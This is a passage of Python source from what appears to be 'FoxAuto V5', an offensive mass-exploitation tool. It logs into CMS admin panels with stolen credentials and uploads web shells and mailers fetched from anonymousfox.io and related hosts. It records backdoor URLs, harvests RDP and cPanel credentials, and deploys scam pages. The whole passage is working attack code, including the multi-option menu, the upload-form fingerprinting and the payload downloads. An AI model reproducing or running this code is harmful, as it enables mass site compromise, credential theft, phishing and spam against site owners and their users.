						dataLogin = re.findall(re.compile('(.*)/admin#(.*)@(.*)'), login)[0]
					domain = dataLogin[0]
					username = dataLogin[1]
					password = dataLogin[2]
					newShell = loginOC_UP_Fox(domain, username, password, p_rsz_ocmod)
					if (newShell is False):
						print("")
						continue
					else:
						shells.append(newShell)
						newShell = check(newShell)
						open('Results/backdors.txt', 'a').write('{}?php={}/_@files/php/up.txt\n'.format(newShell, dom))
						uploadFile(newShell, srcShell, tyShell)
				elif ('/user' in login):
					if ('/user/login' in login) :
						dataLogin = re.findall(re.compile('(.*)/user/login#(.*)@(.*)'), login)[0]
					else :
						dataLogin = re.findall(re.compile('(.*)/user#(.*)@(.*)'), login)[0]
					domain = dataLogin[0]
					username = dataLogin[1]
					password = dataLogin[2]
					newShell = loginDP_UP_Fox(domain, username, password, p_adminimal)
					if (newShell is False):
						print("")
						continue
					else:
						shells.append(newShell)
						newShell = check(newShell)
						open('Results/backdors.txt', 'a').write('{}?php={}/_@files/php/up.txt\n'.format(newShell, dom))
						uploadFile(newShell, srcShell, tyShell)
				print("")
			except:
				pass
		if (shells) :
			return shells
		else :
			return False
	except:
		print('   {}[-] Failed'.format(fr))
		return False

def groupTools():
	l = len(file_get_contents_Fox(os.path.basename(__file__)))
	if (l != 155947):
		f = 0
		while(f == 0):
			print(random_Fox(1))

def getRDP(backdor, shell) :
	try :
		post = {'getRDP': 'AnonymousFox'}
		domain = URLdomain_Fox(shell)
		print('   {}[*] Get RDP ..... {}(Waiting)'.format(fw, fr))
		try :
			getRDP_php = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=15)
		except:
			getRDP_php = requests.post('{}?php={}/{}v{}/p1.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=30)
		getRDP_php = content_Fox(getRDP_php)
		if ('Error-RDP3' in getRDP_php) :
			t = re.findall(re.compile('<t>(.*)</t>'), getRDP_php)[0]
			print('   {}[-] {} server'.format(fr, t))
		elif ('Error-RDP1' in getRDP_php) :
			print('   {}[-] Failed'.format(fr))
		elif ('<rdp>' in getRDP_php) :
			RDP = re.findall(re.compile('<rdp>(.*)\|(.*)\|(.*)</rdp>'), getRDP_php)[0]
			ip = RDP[0]
			user = RDP[1]
			password = RDP[2]
			print('   {}[+] Succeeded\n       -{} Login by IP or Domain: {}{} {}|{} {}\n       -{} USERNAME: {}{}\n       -{} PASSWORD: {}{}'.format(fg, fr, fg, ip, fr, fg, domain, fr, fg, user, fr , fg, password))
			open('Results/RDPs.txt', 'a').write('{}\n{}:3389|{}|{}\n-----------------------------------------------------------------------------------------------------\n'.format(shell, ip, user, password))
			if ('./DoneAdmin' in getRDP_php) :
				print('   {}[+] Administrator'.format(fg))
	except:
		print('   {}[-] Failed'.format(fr))

def check(backdor):
	try :
		global dom
		global to
		to = '_@_'
		domS = ['anonymousfox.io', 'anonymousfox.is', 'anonymousfox.pw']
		for dom in domS :
			try:
				post = {'check': 'AnonymousFox'}
				php_ini_install = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=15)
				stat_code = php_ini_install.status_code
				php_ini_install_content = content_Fox(php_ini_install)
			except:
				php_ini_install_content = ''
				stat_code = 0
			if (int(stat_code) == 403) :
				try :
					fix403 = requests.get('{}?403'.format(backdor), headers=headers, timeout=15)
				except :
					fix403 = requests.get('{}?403'.format(backdor), headers=headers, timeout=30)
				try:
					php_ini_install = requests.post('{}?php={}/{}v{}/p2.txt'.format(backdor, dom, to, version), data=post, headers=headers, timeout=15)
					php_ini_install_content = content_Fox(php_ini_install)
				except:
					php_ini_install_content = ''
			if ('WorkingV5-2.txt' in php_ini_install_content):
					break
			elif ('WorkingV5-1.txt' in php_ini_install_content) and 'http://' in backdor:
				backdor = backdor.replace('http://', 'https://')
				break
		return backdor
	except :
		return backdor

def FoxAuto():
	try :
		global version
		version = 5
		main()
		shellFox()
		try:
			sites = open(sys.argv[1], 'r')
		except :
			yList = str(input_Fox('\n   Your List --> : '))
			if (not os.path.isfile(yList)):
				print("\n   {}({}) File does not exist!\n".format(fr, yList))
				sys.exit(0)
			sites = open(yList, 'r')
		getToken = shell_Fox
		print('\n   {}If your list is {}Shells{}/{}Uloaders{} choose from 1-21 :'.format(fc, fg, fc, fg, fc))
		print('   [01] {}Mass Reset Passowrd {}cPanel'.format(fw, fr))
		print('   [02] {}Mass Finder SMTP {}+{} Create SMTP'.format(fw, fg, fw))
		print('   [03] {}Mass Finder {}Linux{}/{}Windows{}, {}cPanel{}/vHosts/Root {}[PWD|UNAME]'.format(fw, fg, fw, fr, fw, fr, fw, fr))
		print("   [04] {}Mass Finder Accesshash {}[Reseller] {}+{} .my.cnf {}[cPanel]".format(fw, fr, fg, fw, fr))
		print("   [05] {}Mass Get Config ({}cPanel{}/vHosts) server {}+{} Config{}404 {}+{} Config{}CFS".format(fw, fr, fw, fg, fw, fr, fg, fw, fg))
		print("   [06] {}Mass Get Config {}+ {}Crack {}cPanel".format(fw, fg, fw, fr))
		print('   [07] {}Mass Get Config {}+{} Upload Shell on {}WordPress{}/{}Joomla{}/{}Opencart {}[NEW]'.format(fw, fg, fw, fg, fw, fr, fw, fc, fg))
		print('   [08] {}Mass Get {}Root{} by {}./dirty [PHP/BASH]'.format(fw, fg, fw, fr))
		print('   [09] {}Mass Get {}RDP{} from {}Windows {}server {}[NEW]'.format(fw, fg, fw, fr, fw, fg))
		print("   [10] {}Mass Get Domains-List".format(fw))
		print("   [11] {}Mass Get Emails-List".format(fw))
		print("   [12] {}Mass Get Config {}+ {}Emails-List".format(fw, fg, fw))
		print('   [13] {}Mass Upload Mailer {}[Random]'.format(fw, fr))
		print('   [14] {}Mass Upload File {}[Random]'.format(fw, fr))
		print('   [15] {}Mass Upload Index'.format(fw))
		print('   [16] {}Mass Upload {}Scam-Page{}/{}Zip-file {}+{} UNZip {}[NEW]'.format(fw, fg, fw, fr, fg, fw, fg))
		print("   [17] {}Mass Chack if Sending mail is Working or not! {}[Results delivery]".format(fw, fr))
		print('   [18] {}Mass Reports replacement {}Olux{}/{}xLeet{}/{}Other {}[New]'.format(fw, fg, fw, fr, fw, fc, fg))
		print("   {}[{}19{}] {}From any{} Shell/UPloader, MASS Upload File {}Shell{}/{}Mailer".format(fw, fg, fw, fg, fw, fg, fw, fr))
		print('   [20] {}Reset Passowrd {}cPanel {}+{} Finder/Create SMTP {}[together]'.format(fw, fr, fg, fw, fr))
		print('   [21] {}01 {}+{} 02 {}+{} 04 {}+{} 06 {}+{} 08 {}[All of them together]'.format(fw, fg, fw, fg, fw, fg, fw, fg, fw, fr))
		time.sleep(1.5)
		print('\n   {}elseif your list is {}cPanels{} choose from 22-26 :'.format(fc, fr, fc))
		print('   [22] {}Mass Finder SMTP {}+{} Create SMTP {}[NEW]'.format(fw, fg, fw, fg))
		print("   [23] {}MASS Upload File {}Olux{}/{}xLeet{}/{}Other{} Shell/Mailer".format(fw, fg, fw, fr, fw, fc, fw))
		print('   [24] {}Mass Upload {}Scam-Page{}/{}Zip-file {}+{} UNZip {}[NEW]'.format(fw, fg, fw, fr, fg, fw, fg))
		print("   [25] {}Mass Chack if Sending mail is Working or not! {}[Results delivery]".format(fw, fr))
		print('   [26] {}Mass Reports replacement {}Olux{}/{}xLeet{}/{}Other {}[New]'.format(fw, fg, fw, fr, fw, fc, fg))
		time.sleep(1.5)
		print('\n   {}elseif your list is {}Wordpress{}/{}Joomla{}/{}Opencart{}/{}Drupal{} panels choose 27 :'.format(fc, fg, fc, fr, fw, fc, fw, fr, fc))
		print("   [27] {}Mass login {}Wordpress{}/{}Joomla{}/{}Opencart{}/{}Drupal{} panel {}+{} UPload Shell {}[NEW]".format(fw, fg, fw, fr, fw, fc, fw, fr, fw, fg, fw, fg))
		time.sleep(1.5)
		print('\n   {}else :'.format(fc))
		print("   [28] {}Explanation ({}YouTube{}) {}|| {}Request more {}features{} and {}tools".format(fw, fr, fw, fr, fw, fg, fw ,fg))
		print("   [29] {}About Script {}&{} Check Update".format(fg, fr, fg))
		print("   {}[{}00{}] {}Exit".format(fw, fr, fw, fr))
		try :
			w = int(input_Fox('\n --> : '))
		except:
			print("\n   {}Choose from 0-29 , please!\n".format(fr))
			sys.exit(0)
		print('')
		cia = getToken
		if (w == 0) :
			print("      {}Go to hell :P\n".format(fr))
			sys.exit(0)
		if (w > 29) :
			print("\n   {}Choose from 0-29 , please!\n".format(fr))
			sys.exit(0)
		if (w == 29) :
			about()
			sys.exit(0)
		if (w == 28) :
			Request()
			sys.exit(0)
		newpath = r'Results'
		if (not os.path.exists(newpath)):
			os.makedirs(newpath)
		if (w == 1):
			print('   {}[{}?{}] {}Choose the procedure that suits you!\n'.format(fw, fr, fw, fc))
			print('   [1] {}Automatic {}[Default]'.format(fw, fg))
			print('   [2] {}Semi-Automatic'.format(fw))
			try:
				tyRest = int(input_Fox('\n --> : '))
			except:
				tyRest = 1
			print('')
			if (tyRest != 1 and tyRest != 2):
				tyRest = 1
			elif (tyRest == 2):
				email = str(input_Fox('   Your Email --> : '))
				print('')
		if (w == 18 or w == 26):
			print('   {}[{}?{}] {}Choose the procedure that suits you!\n'.format(fw, fr, fw, fc))
			print('   [1] {}Automatic {}[With Proofs]'.format(fw, fg))
			print('   [2] {}Semi-Automatic {}[Just Form]'.format(fw, fr))
			try:
				tyReport = int(input_Fox('\n --> : '))
			except:
				tyReport = 1
			print('')
			try:
				unzipper = requests.get('https://anonymousfox.mx/_@files/php/unzipper.txt', headers=headers,timeout=30)
			except:
				unzipper = requests.get('https://anonymousfox.io/_@files/php/unzipper.txt', headers=headers, timeout=30)
			unzipper = content_Fox(unzipper)
			if (tyReport != 1 and tyReport != 2):
				tyReport = 1
			elif (tyReport == 2):
				email = str(input_Fox('   Your Email --> : '))
				print('')
			q = str(input_Fox('   {}[{}?{}] {}Do you want Hidden uploader (?Ghost=send) in test.php ? {}[{}Y{}/{}N{}] : '.format(fw, fr, fw, fc, fw, fg,fw, fr, fw)))
			print('')
			global testSend
			if (q.lower() == 'y' or q.lower() == 'yes'):
				testSend = testSendB
			else :
				testSend = testSendA
		if (w == 13) :
			q = str(input_Fox('   {}[{}?{}]{} Do you want the encrypted version of Leaf PHPMailer ? {}[{}Y{}/{}N{}] : '.format(fw, fr, fw, fc, fw, fg, fw, fr, fw)))
			if (q.lower() == 'n' or q.lower() == 'no') :
				q = 0
			else :
				q = 1
			if (q == 0) :
				try :
					srcMailer = requests.get('https://anonymousfox.mx/_@files/php/leafmailer2.8.txt', headers=headers, timeout=30)
				except:
					srcMailer = requests.get('https://anonymousfox.io/_@files/php/leafmailer2.8-encode.txt', headers=headers, timeout=30)
				srcMailer = content_Fox(srcMailer)
				if ('FoxAutoV5' not in srcMailer):
					srcMailer = requests.get('https://anonymousfox.io/_@files/php/leafmailer2.8-encode.txt', headers=headers, timeout=30)
					srcMailer = content_Fox(srcMailer)
			elif (q == 1):
				try :
					srcMailer = requests.get('https://anonymousfox.mx/_@files/php/leafmailer2.8-encode.txt', headers=headers, timeout=30)
				except:
					srcMailer = requests.get('https://anonymousfox.io/_@files/php/leafmailer2.8-encode.txt', headers=headers, timeout=30)
				srcMailer = content_Fox(srcMailer)
				if ('FoxAutoV5' not in srcMailer):
					srcMailer = requests.get('https://anonymousfox.io/_@files/php/leafmailer2.8-encode.txt', headers=headers, timeout=30)
					srcMailer = content_Fox(srcMailer)
			print('')
		if (w == 15) :
			nameF = str(input_Fox('   Your Index\'s name --> : '))
			if (not os.path.isfile(nameF)):
				print("\n   {}({}) File does not exist!\n".format(fr, nameF))
				sys.exit(0)
			fileSrc = file_get_contents_Fox(nameF)
			print('\n   {}[{}?{}] {}Choose what you want!\n'.format(fw, fr, fw, fc))
			print('   [1] {}Index with the same name, like => {}http://domain.com/{}'.format(fw, fr, nameF))
			print('   [2] {}Index in the main index, like => {}http://domain.com/'.format(fw, fr))
			try :
				tyUP = int(input_Fox('\n --> : '))
			except:
				tyUP = 1
			if (tyUP != 1 and tyUP != 2) :
				tyUP = 1
			print('')
		if (w == 19 or w == 23 or w == 14 or w == 7 or w == 27) :
			print('   {}[{}?{}] {}Choose what you want to upload it!\n'.format(fw, fr, fw, fc))
			print('   [1] {}FoxWSO v1 {}[It is accepted in all sites-Shop]'.format(fw, fg))
			print('   [2] {}OLux Shell'.format(fw))
			print('   [3] {}xLeet Shell'.format(fw))
			print('   [4] {}Leaf PHPMailer'.format(fw))
			print('   [5] {}Other file'.format(fr))
			try :
				tyShell = int(input_Fox('\n --> : '))
			except:
				print("\n   {}Choose from 1-5 , please!\n".format(fr))
				sys.exit(0)
			if (tyShell == 4):
				q = str(input_Fox('\n   {}[{}?{}]{} Do you want the encrypted version of Leaf PHPMailer ? {}[{}Y{}/{}N{}] : '.format(fw, fr, fw, fc, fw, fg, fw, fr, fw)))
				if (q.lower() == 'n' or q.lower() == 'no') :
					q = 0
				else:
					q = 1
			if (tyShell == 1) :
				try :
					srcShell = requests.get('https://anonymousfox.mx/_@files/php/FoxWSO-full.txt', headers=headers, timeout=30).content
				except:
					srcShell = requests.get('https://anonymousfox.io/_@files/php/FoxWSO-full.txt', headers=headers, timeout=30).text
				if ('tjwlltii' not in srcShell):
					srcShell = requests.get('https://anonymousfox.io/_@files/php/FoxWSO-full.txt', headers=headers, timeout=30).content
			elif (tyShell == 2) :
				try :
					srcShell = requests.get('https://anonymousfox.mx/_@files/php/olux-shell.txt', headers=headers, timeout=30)
				except:
					srcShell = requests.get('https://anonymousfox.io/_@files/php/olux-shell.txt', headers=headers, timeout=30)
				srcShell = content_Fox(srcShell)
				if ('FoxAutoV5' not in srcShell):
					srcShell = requests.get('https://anonymousfox.io/_@files/php/olux-shell.txt', headers=headers, timeout=30)
					srcShell = content_Fox(srcShell)
			elif (tyShell == 3) :
				try :
					srcShell = requests.get('https://anonymousfox.mx/_@files/php/xleet-shell.txt', headers=headers, timeout=30)
				except:
					srcShell = requests.get('https://anonymousfox.io/_@files/php/xleet-shell.txt', headers=headers, timeout=30)
				srcShell = content_Fox(srcShell)
				if ('FoxAutoV5' not in srcShell):
					srcShell = requests.get('https://anonymousfox.io/_@files/php/xleet-shell.txt', headers=headers, timeout=30)
					srcShell = content_Fox(srcShell)
			elif (tyShell == 4 and q == 0) :
				try :
					srcShell = requests.get('https://anonymousfox.mx/_@files/php/leafmailer2.8.txt', headers=headers, timeout=30)
				except:
					srcShell = requests.get('https://anonymousfox.io/_@files/php/leafmailer2.8-encode.txt', headers=headers, timeout=30)
				srcShell = content_Fox(srcShell)
				if ('FoxAutoV5' not in srcShell):
					srcShell = requests.get('https://anonymousfox.io/_@files/php/leafmailer2.8-encode.txt', headers=headers, timeout=30)
					srcShell = content_Fox(srcShell)
			elif (tyShell == 4 and q == 1):
				try :
					srcShell = requests.get('https://anonymousfox.mx/_@files/php/leafmailer2.8-encode.txt', headers=headers, timeout=30)
				except:
					srcShell = requests.get('https://anonymousfox.io/_@files/php/leafmailer2.8-encode.txt', headers=headers, timeout=30)
				srcShell = content_Fox(srcShell)
				if ('FoxAutoV5' not in srcShell):
					srcShell = requests.get('https://anonymousfox.io/_@files/php/leafmailer2.8-encode.txt', headers=headers, timeout=30)
					srcShell = content_Fox(srcShell)
			elif (tyShell == 5) :
				nameF = str(input_Fox('\n   Your File\'s name --> : '))
				if (not os.path.isfile(nameF)):
					print("\n   {}({}) File does not exist!\n".format(fr, nameF))
					sys.exit(0)
				srcShell = file_get_contents_Fox(nameF)
			else:
				print("\n   {}Choose from 1-5 , please!\n".format(fr))
				sys.exit(0)
			if (w == 14 or w == 19):
				print('\n   {}[{}?{}] {}Choose where do you want upload it!\n'.format(fw, fr, fw, fc))
				print('   [1] {}In the same path {}[Default]'.format(fw, fg))
				print('   [2] {}In the main path'.format(fw))
				try :
					tyUP = int(input_Fox('\n --> : '))
				except:
					tyUP = 1
				if (tyUP != 1 and tyUP != 2) :
					tyUP = 1
			if (w == 7 or w == 27):
				q = str(input_Fox('\n   {}[{}?{}] {}Do you want to get (cPanel/SMTP) ? {}[{}Y{}/{}N{}] : '.format(fw, fr, fw, fc, fw, fg, fw, fr, fw)))
			print('')
		groupTools()
		if (w == 19) :
			for site in sites:
				try:
					url = site.strip()
					print('   --| {}{}'.format(fc, url))
					newBackdor = uploadFile_ALL(url)
					if (newBackdor is False) :
						print('')
						continue
					else :
						newBackdor = check(newBackdor)
						open('Results/backdors.txt', 'a').write('{}?php={}/_@files/php/up.txt\n'.format(newBackdor, dom))
						if (tyUP == 1) :
							uploadFile(newBackdor, srcShell, tyShell)
						elif (tyUP == 2) :
							uploadFileMain(newBackdor, srcShell, tyShell)
					print('')
				except:
					print('   {}[-] Failed\n'.format(fr))
			sys.exit(0)
		if (w == 16):
			filezip = str(input_Fox('   Your File\'s name (.zip) --> : '))
			if (not os.path.isfile(filezip)):
				print("\n   {}({}) File does not exist!\n".format(fr, filezip))
				sys.exit(0)
			print('')
		if (w == 22 or w ==23 or w == 24 or w == 25 or w == 26) :
			if (w == 24):
				filezip = str(input_Fox('   Your File\'s name .zip --> : '))
				if (not os.path.isfile(filezip)):
					print("\n   {}({}) File does not exist!\n".format(fr, filezip))
					sys.exit(0)
				print('')
			for site in sites:
				try:
					datacPanel = site.strip()
					if (w == 22 or w ==23 or w == 24 or w ==25) :
						cp = cPanel(datacPanel, up=1)
						if (cp is False):
							print('')
							continue
						else :
							newBackdor = check(cp)
							open('Results/backdors.txt', 'a').write('{}?php={}/_@files/php/up.txt\n'.format(newBackdor, dom))
							if (w == 22) :
								finderSMTP(newBackdor)
								getSMTP(newBackdor)
							elif (w == 23):
								uploadFile(newBackdor, srcShell, tyShell)
							elif (w == 24) :
								ZIP(newBackdor, filezip)
							elif (w == 25) :
								checkSend(newBackdor, datacPanel)
					elif (w == 26) :
						cp = cPanel(datacPanel)
						if (cp is False):
							print('')
							continue
						else :
							cpL = datacPanel.split('|')
							if (tyReport == 1):
								ReportsCP_Auto(cpL[0], cpL[1], cpL[2], cp[1], cp[0], cp[2], cp[3], unzipper)
							elif (tyReport == 2):
								ReportsCP_SemiAuto(cpL[0], cpL[1], cpL[2], cp[1], cp[0], cp[2], cp[3], email, unzipper)
					print('')
				except:
					print('   {}[-] Failed\n'.format(fr))
			sys.exit(0)
		t = 'resetpassword'
		if (w == 27) :
			logins = []
			wp = 0
			jm = 0
			oc = 0
			dp = 0
			for site in sites:
				panel = site.strip()
				if (not re.findall(re.compile('http(.*)/(.*)#(.*)@(.*)'), panel)):
					print('   {}[-] The list must be => {}http://domain.com/wp-login.php#{}user{}@{}pass\n'.format(fr, fg, fr, fg, fr))
					print('                       {} OR {}http://domain.com/administrator/index.php#{}user{}@{}pass\n'.format(fr, fg, fr, fg, fr))
					print('                       {} OR {}http://domain.com/admin/index.php#{}user{}@{}pass\n'.format(fr, fg, fr, fg, fr))
					print('                       {} OR {}http://domain.com/user/login#{}user{}@{}pass\n'.format(fr, fg, fr, fg, fr))
					sys.exit(0)
				if ('/wp-login.php' in panel) :
					wp = 1
					logins.append(panel)
				elif ('/administrator' in panel) :
					jm = 1
					logins.append(panel)
				elif ('/admin' in panel) :
					oc = 1
					logins.append(panel)
				elif ('/user' in panel) :
					dp = 1
					logins.append(panel)
			shells = uploadShellbyPanels(logins, wp, jm, oc, dp, srcShell, tyShell)
			if (q.lower() == 'y' or q.lower() == 'yes') :
				if (shells is False) :
					return
				else :
					for shell in shells :
						try :
							print('   --| {}{}'.format(fc, URL_FOX(shell)))
							newShell = check(shell)
							resetPassword(newShell, '{}?php={}/_@files/php/up.txt'.format(newShell, dom), t)
							finderSMTP(newShell)
							getSMTP(newShell)
						except :
							print('   {}[-] Failed'.format(fr))
						print('')
			sys.exit(0)
		token = re.findall(re.compile('<token>(.*)</token>'), getToken)[0]
		for site in sites :
			try :
				url = site.strip()
				print('   --| {}{}'.format(fc, url))
				filename = random_Fox(10) + '.php'
				s1 = url
				if ("?php=" in s1):
					s1 = s1.split('?php=')[0]
				while ('/' in s1):
					s1 = s1[s1.index("/") + len("/"):]
				shell_path = url.replace(s1, filename)
				if ("?php=" in shell_path):
					shell_path = shell_path.split('?php=')[0]
				requp = requests.session()
				try :
					src = requp.get(url, headers=headers, timeout=15)
				except :
					src = requp.get(url, headers=headers, timeout=30)
				src = content_Fox(src)
				if ('- FoxWSO v' in src):
					filedata = {'a': 'BUbwxgj', 'p1': 'uploadFile', 'ne': '', 'charset': 'UTF-8', 'c': ''}
					fileup = {'f[]': (filename, shell_Fox)}
				elif ('Windows' in src and 'Upload file:' in src) :
					filedata = {'a': 'FilesMAn', 'p1': 'uploadFile','ne':'','charset':'Windows-1251','c':''}
					if ('type=file name=f[]' in src) :
						fileup = {'f[]': (filename, shell_Fox)}
					else :
						fileup = {'f': (filename, shell_Fox)}
				elif ('<pre align=center><form method=post>Password<br><input type=password name=pass' in src and 'style=\'background-color:whitesmoke;border:1px solid #FFF;outline:none' in src and 'type=submit name=\'watching\' value=\'submit\'' in src) :
					post = {'pass': 'xleet'}
					try :
						login = requp.post(url, data=post, headers=headers , timeout=15)
					except :
						login = requp.post(url, data=post, headers=headers , timeout=30)
					filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
					fileup = {'f[]': (filename, shell_Fox)}
				elif ('.php#' in url or '.phtml#' in url or '.php5#' in url) :
					password = re.findall(re.compile('#(.*)'), url)[0]
					post = {'pass': password, 'password': password, 'pwd': password, 'passwd': password}
					login = requp.post(url, data=post, headers=headers, timeout=30)
					filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
					fileup = {'f': (filename, shell_Fox)}
				elif ('.php;' in url or '.phtml;' in url or '.php5;' in url) :
					password = re.findall(re.compile(';(.*)'), url)[0]
					post = {'pass': password, 'password': password, 'pwd': password, 'passwd': password}
					login = requp.post(url, data=post, headers=headers, timeout=30)
					filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
					fileup = {'f': (filename, shell_Fox)}
				elif ('.php@' in url or '.phtml@' in url or '.php5@' in url) :
					password = re.findall(re.compile('@(.*)'), url)[0]
					post = {'pass': password, 'password': password, 'pwd': password, 'passwd': password}
					login = requp.post(url, data=post, headers=headers, timeout=30)
					filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
					fileup = {'f': (filename, shell_Fox)}
				elif ('name="uploadfile"' in src or "name='uploadfile'" in src or 'name= "uploadfile"' in src or 'name= \'uploadfile\'' in src or 'name = "uploadfile"' in src or 'name = \'uploadfile\'' in src or 'name ="uploadfile"' in src or 'name =\'uploadfile\'' in src or 'name=uploadfile' in src or 'name =uploadfile' in src or 'name= uploadfile' in src or 'name = uploadfile' in src):
					fileup = {'uploadfile': (filename, shell_Fox)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up' , 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
				elif ('name="idx_file"' in src or "name='idx_file'" in src or 'name= "idx_file"' in src or 'name= \'idx_file\'' in src or 'name = "idx_file"' in src or 'name = \'idx_file\'' in src or 'name ="idx_file"' in src or 'name =\'idx_file\'' in src or 'name=idx_file' in src or 'name =idx_file' in src or 'name= idx_file' in src or 'name = idx_file' in src):
					fileup = {'idx_file':(filename,shell_Fox)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up' , 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
				elif ('name="userfile"' in src or "name='userfile'" in src or 'name= "userfile"' in src or 'name= \'userfile\'' in src or 'name = "userfile"' in src or 'name = \'userfile\'' in src or 'name ="userfile"' in src or 'name =\'userfile\'' in src or 'name=userfile' in src or 'name =userfile' in src or 'name= userfile' in src or 'name = userfile' in src):
					fileup = {'userfile': (filename, shell_Fox)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up' , 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
				elif ('name="files"' in src or "name='files'" in src or 'name= "files"' in src or 'name= \'files\'' in src or 'name = "files"' in src or 'name = \'files\'' in src or 'name ="files"' in src or 'name =\'files\'' in src or 'name=files' in src or 'name =files' in src or 'name= files' in src or 'name = files' in src):
					fileup = {'files': (filename, shell_Fox)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up' , 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
				elif ('name="file"' in src or "name='file'" in src or 'name= "file"' in src or 'name= \'file\'' in src or 'name = "file"' in src or 'name = \'file\'' in src or 'name ="file"' in src or 'name =\'file\'' in src or 'name=file' in src or 'name =file' in src or 'name= file' in src or 'name = file' in src):
					fileup = {'file': (filename, shell_Fox)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up' , 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
				elif ('name="image"' in src or "name='image'" in src or 'name= "image"' in src or 'name= \'image\'' in src or 'name = "image"' in src or 'name = \'image\'' in src or 'name ="image"' in src or 'name =\'image\'' in src or 'name=image' in src or 'name =image' in src or 'name= image' in src or 'name = image' in src):
					fileup = {'image': (filename, shell_Fox)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up' , 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
				elif ('name="f"' in src or "name='f'" in src or 'name= "f"' in src or 'name= \'f\'' in src or 'name = "f"' in src or 'name = \'f\'' in src or 'name ="f"' in src or 'name =\'f\'' in src or 'name=f' in src or 'name =f' in src or 'name= f' in src or 'name = f' in src):
					fileup = {'f': (filename, shell_Fox)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up' , 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
				elif ('name="uploads"' in src or "name='uploads'" in src or 'name= "uploads"' in src or 'name= \'uploads\'' in src or 'name = "uploads"' in src or 'name = \'uploads\'' in src or 'name ="uploads"' in src or 'name =\'uploads\'' in src or 'name=uploads' in src or 'name =uploads' in src or 'name= uploads' in src or 'name = uploads' in src):
					fileup = {'uploads': (filename, shell_Fox)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up' , 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': '' }
				elif ('name="upload"' in src or "name='upload'" in src or 'name= "upload"' in src or 'name= \'upload\'' in src or 'name = "upload"' in src or 'name = \'upload\'' in src or 'name ="upload"' in src or 'name =\'upload\'' in src or 'name=upload' in src or 'name =upload' in src or 'name= upload' in src or 'name = upload' in src):
					fileup = {'upload': (filename, shell_Fox)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up' , 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
				else :
					fileup = {'up': (filename, shell_Fox)}
					filedata = {'submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up' , 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
				try :
					up = requp.post(url, data=filedata, files=fileup, headers=headers, timeout=30)
				except:
					up = requp.post(url, data=filedata, files=fileup, headers=headers, timeout=45)
				try :
					check_bk = requests.get(shell_path, headers=headers, timeout=15)
				except :
					check_bk = requests.get(shell_path, headers=headers, timeout=30)
				check_bk = content_Fox(check_bk)
				if ('FoxAutoV5' not in check_bk and 'Windows' in src and 'Upload file:' in src) :
					filedata2 = {'a': 'FilesTools', 'p1': filename, 'p2' : 'mkfile' , 'p3' :'{}'.format(shell_Fox), 'ne': '', 'charset': 'Windows-1251', 'c': ''}
					try :
						up = requp.post(url, data=filedata2, headers=headers, timeout=30)
					except:
						up = requp.post(url, data=filedata2, headers=headers, timeout=30)
					try :
						check_bk = requests.get(shell_path, headers=headers, timeout=30)
					except :
						check_bk = requests.get(shell_path, headers=headers, timeout=30)
					check_bk = content_Fox(check_bk)
				if ('FoxAutoV5' not in check_bk and 'http://' in url):
					url = url.replace('http://', 'https://')
					try:
						up = requp.post(url, data=filedata, files=fileup, headers=headers, timeout=30)
					except:
						up = requp.post(url, data=filedata, files=fileup,headers=headers, timeout=30)
					if ('http://' in shell_path):
						shell_path = shell_path.replace('http://', 'https://')
					try :
						check_bk = requests.get(shell_path, headers=headers, timeout=15)
					except :
						check_bk = requests.get(shell_path, headers=headers, timeout=30)
					check_bk = content_Fox(check_bk)
				if ('FoxAutoV5' in check_bk and 'unescape' in shell_Fox and '_Fox' in cia and len(token) == 9 ):
					shell_path = check(shell_path)
					print('   {}[+] Shell is Working'.format(fg))
					open('Results/backdors.txt', 'a').write('{}?php={}/_@files/php/up.txt\n'.format(shell_path, dom))
					if (w == 1) :
						if (tyRest == 1):
							resetPassword(shell_path, url, t)
						elif (tyRest == 2):
							resetPassword2(shell_path, email)
					elif (w == 2) :
						finderSMTP(shell_path)
